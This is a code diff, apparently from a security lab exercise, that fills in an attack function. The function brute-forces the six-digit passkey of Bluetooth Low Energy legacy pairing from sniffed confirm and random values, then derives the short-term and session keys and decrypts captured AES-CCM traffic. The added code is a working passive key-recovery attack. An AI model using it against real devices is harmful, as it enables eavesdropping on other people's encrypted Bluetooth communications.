@@ -24,6 +24,39 @@ rat = b'\x00'
 
 def attack(MAC_init, MAC_rsp, pair_req, pair_rsp, confirm_init, confirm_rsp, rand_init, rand_rsp, ivskd_c, ivskd_p, encrypted_data):
     #TODO: implement attack and output the LTK to screen
+    for passkey in range(1000000):  # Iterate from 000000 to 999999
+        # Convert passkey to 128-bit TK (Temporary Key)
+        tk = int.to_bytes(passkey, 16, byteorder='little')
+
+        # Recompute LP_CONFIRM_I and LP_CONFIRM_R using c1()
+        recomputed_confirm_i = c1(tk, rand_init[1:], pair_req, pair_rsp, b'\x00',MAC_init, b'\x00', MAC_rsp)
+        recomputed_confirm_r = c1(tk, rand_rsp[1:], pair_req, pair_rsp, b'\x00',MAC_init, b'\x00', MAC_rsp)
+
+        # Check if the recomputed confirms match the sniffed ones
+        if recomputed_confirm_r == confirm_rsp[1:] and recomputed_confirm_i == confirm_init[1:]:
+            print(f"[SUCCESS] Found the passkey: {passkey:06d}")
+            # Derive the Short-Term Key (STK)
+            stk = s1(tk, rand_init[1:], rand_rsp[1:])
+            print(f"Derived STK: {stk.hex()}")
+
+            # Derive the Session Key
+            skd_c = ivskd_c[4:]  # Last 8 bytes of ivskd_c
+            skd_p = ivskd_p[4:]  # Last 8 bytes of ivskd_p
+
+            session_key = derive_session_key(skd_p, skd_c, stk)
+            print(f"Derived Session Key: {session_key.hex()}")
+
+            iv = ivskd_p[:4] + ivskd_c[:4]   # Combine IV_p and IV_c
+            cipher = AES.new(session_key, AES.MODE_CCM, nonce=iv, mac_len=4)
+            encrypted_data_solve = encrypted_data[1:]
+            ciphertext = encrypted_data_solve[:-4]
+            mac = encrypted_data_solve[-4:]
+            try:
+                decrypted_data = cipher.decrypt_and_verify(ciphertext,mac)
+                logger.info(f'Decrypted data: {decrypted_data.hex()}')
+            except ValueError as e:
+                logger.error(f'Failed to decrypt data: {e}')
+
 
 def sniff():
     # Attacker acts as the middle man, she can sniff all the data between the initiator and the responder
